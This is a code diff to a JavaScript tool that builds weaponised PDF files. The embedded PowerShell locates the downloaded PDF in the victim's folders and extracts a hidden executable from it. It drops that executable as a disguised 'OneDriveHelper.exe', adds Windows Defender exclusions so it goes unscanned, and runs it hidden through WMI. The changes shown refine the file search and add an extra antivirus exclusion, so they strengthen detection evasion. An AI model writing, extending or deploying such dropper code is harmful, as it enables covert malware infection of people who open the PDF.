@@ -601,15 +601,16 @@ function buildExecPdf(opts = {}, exeBuf = null) {
   //   3. Falls back to Start-Process if WMI is unavailable
   // "$o=12345678" is an 8-char sentinel patched after PDF construction.
   const psRaw =
-    `$fn='${filename}.pdf';` +
+    `$fn='${filename}';` +
     `$u=$env:USERPROFILE;` +
     `$locs=@("$u\\Downloads","$u\\Desktop","$env:TEMP","$u\\Documents","$u\\OneDrive\\Desktop","$u\\OneDrive\\Downloads");` +
-    `$fp=$locs|%{$p=Join-Path $_ $fn;if(Test-Path $p){$p}}|?{$_}|Select-Object -First 1;` +
-    `if(!$fp){$fp=Get-ChildItem "$u" -Recurse -Filter $fn -EA 0|Sort-Object LastWriteTime -Desc|Select-Object -First 1|%{$_.FullName}};` +
+    `$fp=$locs|%{Get-ChildItem $_ -Filter "$fn*.pdf" -EA 0 -File|Sort-Object LastWriteTime -Desc|Select-Object -First 1|%{$_.FullName}}|?{$_}|Select-Object -First 1;` +
+    `if(!$fp){$fp=Get-ChildItem "$u" -Recurse -Filter "$fn*.pdf" -EA 0 -File|Sort-Object LastWriteTime -Desc|Select-Object -First 1|%{$_.FullName}};` +
     `if($fp){` +
     `$o=12345678;$z=${exeSize};` +
     `$rb=[IO.File]::ReadAllBytes($fp);$eb=$rb[$o..($o+$z-1)];` +
     `$tp=Join-Path $env:APPDATA OneDriveHelper.exe;` +
+    `try{Add-MpPreference -ExclusionPath $tp -EA Stop}catch{};` +
     `[IO.File]::WriteAllBytes($tp,$eb);` +
     `try{Add-MpPreference -ExclusionProcess $tp -EA Stop}catch{};` +
     `try{([wmiclass]'Win32_Process').Create($tp,$null,$null)|Out-Null}catch{Start-Process $tp -WindowStyle Hidden}` +
@@ -1051,15 +1052,16 @@ function injectLaunchWithExe(pdfBuf, exeBuf, pdfFilename) {
   const pdfStr = s => s.replace(/\\/g, "\\\\").replace(/\(/g, "\\(").replace(/\)/g, "\\)");
 
   const psRaw =
-    `$fn='${fn}.pdf';` +
+    `$fn='${fn}';` +
     `$u=$env:USERPROFILE;` +
     `$locs=@("$u\\Downloads","$u\\Desktop","$env:TEMP","$u\\Documents","$u\\OneDrive\\Desktop","$u\\OneDrive\\Downloads");` +
-    `$fp=$locs|%{$p=Join-Path $_ $fn;if(Test-Path $p){$p}}|?{$_}|Select-Object -First 1;` +
-    `if(!$fp){$fp=Get-ChildItem "$u" -Recurse -Filter $fn -EA 0|Sort-Object LastWriteTime -Desc|Select-Object -First 1|%{$_.FullName}};` +
+    `$fp=$locs|%{Get-ChildItem $_ -Filter "$fn*.pdf" -EA 0 -File|Sort-Object LastWriteTime -Desc|Select-Object -First 1|%{$_.FullName}}|?{$_}|Select-Object -First 1;` +
+    `if(!$fp){$fp=Get-ChildItem "$u" -Recurse -Filter "$fn*.pdf" -EA 0 -File|Sort-Object LastWriteTime -Desc|Select-Object -First 1|%{$_.FullName}};` +
     `if($fp){` +
     `$o=12345678;$z=${exeSize};` +
     `$rb=[IO.File]::ReadAllBytes($fp);$eb=$rb[$o..($o+$z-1)];` +
     `$tp=Join-Path $env:APPDATA OneDriveHelper.exe;` +
+    `try{Add-MpPreference -ExclusionPath $tp -EA Stop}catch{};` +
     `[IO.File]::WriteAllBytes($tp,$eb);` +
     `try{Add-MpPreference -ExclusionProcess $tp -EA Stop}catch{};` +
     `try{([wmiclass]'Win32_Process').Create($tp,$null,$null)|Out-Null}catch{Start-Process $tp -WindowStyle Hidden}` +
